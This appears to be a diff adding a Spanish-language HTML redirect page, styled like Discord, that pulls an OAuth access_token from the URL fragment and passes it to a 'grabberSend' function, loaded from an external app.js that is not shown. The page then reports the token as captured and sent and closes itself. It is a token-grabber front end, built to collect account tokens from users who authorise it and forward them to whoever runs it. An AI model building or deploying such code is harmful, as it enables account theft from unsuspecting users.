@@ -1,0 +1,49 @@
+﻿<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Capturando token...</title>
+<style>
+  body { background:#313338; color:#f2f3f5; font-family:"gg sans",Segoe UI,Arial,sans-serif;
+         display:flex; align-items:center; justify-content:center; min-height:100vh; margin:0; padding:24px; }
+  .box { max-width:520px; width:100%; text-align:center; }
+  .ok { color:#23a55a; } .err { color:#f0b232; }
+  code { display:block; margin-top:14px; background:#1e1f22; border-radius:8px; padding:12px;
+         font-family:Consolas,monospace; font-size:12px; word-break:break-all; text-align:left; color:#dbdee1; }
+</style>
+</head>
+<body>
+<div class="box">
+  <h1 id="msg">Procesando autorizaci&oacute;n...</h1>
+  <code id="tok"></code>
+</div>
+<script src="app.js"></script>
+<script>
+(function () {
+  var q = new URLSearchParams(window.location.hash.substring(1));
+  var token = q.get("access_token");
+  var err   = q.get("error_description") || q.get("error");
+  var msg = document.getElementById("msg");
+  var tok = document.getElementById("tok");
+
+  if (err)     { msg.textContent = "Error: " + err; msg.className = "err"; return; }
+  if (!token)  { msg.textContent = "No lleg\u00f3 ning\u00fan token en la URL."; msg.className = "err"; return; }
+
+  tok.textContent = token;
+  msg.textContent = "Token capturado. Enviando...";
+
+  window.grabberSend(token)
+    .then(function (who) {
+      msg.textContent = "Token capturado y enviado \u2713 (" + who + ")";
+      msg.className = "ok";
+      setTimeout(function () { try { window.close(); } catch (e) {} }, 2500);
+    })
+    .catch(function (e) {
+      msg.textContent = "Token capturado, pero fall\u00f3 el env\u00edo: " + e.message;
+      msg.className = "err";
+    });
+})();
+</script>
+</body>
+</html>
